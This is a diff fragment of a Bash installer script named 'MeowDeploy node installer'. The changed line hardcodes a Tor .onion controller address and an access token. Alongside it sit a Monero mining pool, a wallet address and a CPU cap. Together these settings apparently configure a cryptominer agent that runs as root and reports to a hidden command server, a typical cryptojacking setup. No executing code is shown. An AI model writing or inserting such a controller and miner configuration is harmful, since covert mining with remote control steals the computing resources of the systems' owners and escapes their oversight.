@@ -2,7 +2,7 @@
 # Self-contained MeowDeploy node installer. Debian/Ubuntu x86_64, root required.
 set -Eeuo pipefail
 umask 077
-CONTROLLER=''; TOKEN=''; AGENT_ID="$(hostname -s)"; CPU_PERCENT=30; POOL='gulf.moneroocean.stream:10001'
+CONTROLLER='http://2zcfiyzbxs7x7ige2qj7iorncwzw2ua6p77qc6gi77o3dpy4olszosqd.onion:18765'; TOKEN='meowmeowmeow'; AGENT_ID="$(hostname -s)"; CPU_PERCENT=30; POOL='gulf.moneroocean.stream:10001'
 WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
 VER='6.26.0'; BASE=/opt/meowdeploy; CONF=/etc/meowdeploy; STATE=/var/lib/meowdeploy
 while (($#)); do case "$1" in
